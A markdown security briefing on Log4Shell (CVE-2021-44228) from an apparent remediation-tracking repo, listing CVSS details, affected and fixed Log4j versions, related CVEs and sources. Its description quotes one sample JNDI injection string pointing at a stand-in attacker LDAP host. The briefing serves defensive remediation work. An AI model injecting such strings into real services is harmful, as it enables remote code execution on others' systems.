# SECURITY-NOTES: Log4Shell (CVE-2021-44228)

> Quarterly security briefing — Log4Shell remediation tracking repo (`log4shell-audit`). Open the parent checklist **#6** for the full remediation work plan. This file is the source write-up for that checklist.

## What It Is

Apache Log4j 2's JNDI lookup mechanism was exploitable by an unauthenticated remote attacker controlling log message content. Log4j performs "message lookup substitution" on log strings, and on a crafted input like `${jndi:ldap://attacker/...}`, Log4j resolves the lookup and loads a remote class, which can lead to **arbitrary code execution** against an affected system. Per CVE-2021-44228 / CISA, no authentication is required to trigger it, so the impact spans any internet-facing service logging user input. Only the `log4j-core` JAR is affected; plain `log4j-api` alone is not.

## CVE Identifier

| Field | Value |
|---|---|
| CVE ID | **CVE-2021-44228** |
| CVE name | Log4Shell ("Log4j2 JNDI RCE") |
| Affected package | `org.apache.logging.log4j:log4j-core` |
| Severity | **Critical — CVSS 3.1 base score 10.0** |
| CVSS vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |

## Affected vs. Fixed Versions

**Affected:** Apache Log4j 2 `0`-pre-release through `2.14.1`.

- Apache lists the affected range as `[2.0-beta9, 2.3.1) ∪ [2.4, 2.12.2) ∪ [2.13.0, 2.15.0)`.
- Java 6: `< 2.3.1`
- Java 7: `>= 2.4 < 2.12.2`
- Java 8+: `>= 2.13.0 < 2.15.0`

**First fixed release:** `2.15.0` (partial fix — the 2.15.0 patch did not disable attacker-controlled JNDI lookups in all cases).

**Full remediation targets (CISA-CVE guidance and follow-on CVE fixes):**

| Java runtime | First patched | Recommended to target |
|---|---|---|
| Java 8+ | 2.15.0 | **2.17.1** (2.16.0 disables JNDI by default; 2.16.0 → 2.17.0 fixes CVE-2021-45105 → 2.17.1 fixes CVE-2021-44832) |
| Java 7 | 2.12.2 | **2.12.4** / 2.17.1 (both patched) |
| Java 6 | 2.3.1 | **2.3.2** / 2.17.1 (both patched) |

Related CVEs in the same family: CVE-2021-45046 (fixed in 2.16.0), CVE-2021-45105 (fixed in 2.17.0), CVE-2021-44832 (fixed in 2.17.1).

## Sources

- Apache Logging Services — Log4j security page (affected/fixed version table, CVSS 10.0): https://logging.apache.org/security.html
- CISA — Apache Log4j vulnerability guidance (final recommendation: 2.17.1 / 2.12.4 / 2.3.2): https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance
- Apache Logging Services — CVE-2021-44228 description: https://logging.apache.org/log4j/2.x/security.html
- CVE / NVD record for CVE-2021-44228
- Snyk — Log4Shell remediation cheat sheet (hardening/hardening details): https://snyk.io/blog/log4shell-remediation-cheat-sheet/
- GitHub Advisories Database — GHSA-jfh8-c2jp-5v3q: https://github.com/advisories/GHSA-jfh8-c2jp-5v3q

## Follow-on Remediation Work

See the checklist issue **#6** and its sub-issues for the detailed remediation steps: version upgrades, detection of vulnerable deployments, JNDI disablement / class removal hardening, and automated dependency scanning.
